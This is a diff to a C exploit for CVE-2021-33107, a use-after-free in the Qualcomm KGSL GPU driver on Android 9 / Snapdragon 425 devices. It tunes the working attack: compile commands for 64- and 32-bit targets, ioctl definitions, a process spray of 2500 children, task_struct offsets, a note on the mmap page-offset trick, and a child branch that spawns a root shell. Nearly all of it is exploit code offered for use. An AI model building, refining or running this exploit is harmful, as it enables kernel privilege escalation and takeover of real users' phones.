@@ -1,7 +1,12 @@
 /*
- * CVE-2021-33107 kgsl UAF exploit for Android 9 / SD425 (Adreno 308)
- * CPU-side approach, no GPU commands.
- * Compile: clang -target aarch64-none-linux-android28 -O2 -fPIE -pie -pthread -o exploit exploit.c
+ * CVE-2021-33107 kgsl UAF exploit
+ * CPU-only, no GPU commands.
+ * Optimized for SD425 (Adreno 308, 32-bit GPU) on Android 9 (64-bit CPU).
+ *
+ * Compile (64-bit):
+ *   clang -target aarch64-none-linux-android28 -O2 -fPIE -pie -pthread -o exploit exploit.c
+ * Compile (32-bit, if needed):
+ *   clang -target armv7a-none-linux-androideabi28 -O2 -fPIE -pie -pthread -o exploit exploit.c
  */
 
 #define _GNU_SOURCE
@@ -16,16 +21,12 @@
 #include <pthread.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
-#include <sched.h>
 #include <sys/prctl.h>
-#include <signal.h>
-#include <sys/syscall.h>
-#include <linux/perf_event.h>
-#include <asm/unistd.h>
 #include <sys/wait.h>
-#include <sys/select.h>
-#include <poll.h>
 #include <sys/stat.h>
+#include <sys/poll.h>
+#include <signal.h>
+#include <poll.h>
 
 /* ---------- KGSL ioctl definitions ---------- */
 #define KGSL_IOC_TYPE 0x09
@@ -51,16 +52,6 @@ struct kgsl_gpuobj_free {
 };
 #define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
 
-struct kgsl_gpuobj_info {
-    uint64_t gpuaddr;
-    uint64_t flags;
-    uint64_t size;
-    uint64_t va_len;
-    uint64_t va_addr;
-    unsigned int id;
-};
-#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)
-
 /* Memory flags */
 #define KGSL_MEMFLAGS_USE_CPU_MAP      (1ULL << 28)
 #define KGSL_CACHEMODE_SHIFT           26
@@ -69,8 +60,7 @@ struct kgsl_gpuobj_info {
 
 /* ---------- Exploit parameters ---------- */
 #define UAF_SIZE        (2 * 1024 * 1024)   // 2 MB
-#define SPRAY_PIDS      2000
-#define SCAN_WORDS      (UAF_SIZE / 4)
+#define SPRAY_PIDS      2500                // number of child processes
 
 /* task_struct offsets (Linux 4.9/4.14) */
 #define COMM_OFF        0x818
@@ -100,8 +90,10 @@ static int gpuobj_alloc(uint64_t size, uint64_t flags) {
 }
 
 static void *gpuobj_mmap(size_t size, unsigned int id) {
-    // CRITICAL: KGSL mmap uses the ID directly as the page offset, not shifted.
-    // vma->vm_pgoff is the ID. So offset = id (not id << PAGE_SHIFT)
+    /*
+     * CRITICAL: KGSL mmap uses the ID directly as the page offset,
+     * NOT shifted by PAGE_SHIFT.
+     */
     void *p = mmap(NULL, size, PROT_READ | PROT_WRITE,
                    MAP_SHARED, kgsl_fd, (off_t)id);
     if (p == MAP_FAILED)
@@ -166,6 +158,7 @@ int main(int argc, char **argv) {
                     usleep(50000);
                     pid_t me = getpid();
                     write(notify_pipe[1], &me, sizeof(me));
+                    // Spawn shell
                     execl("/system/bin/sh", "sh", NULL);
                     write(1, "sh exec failed\n", 15);
                     _exit(0);
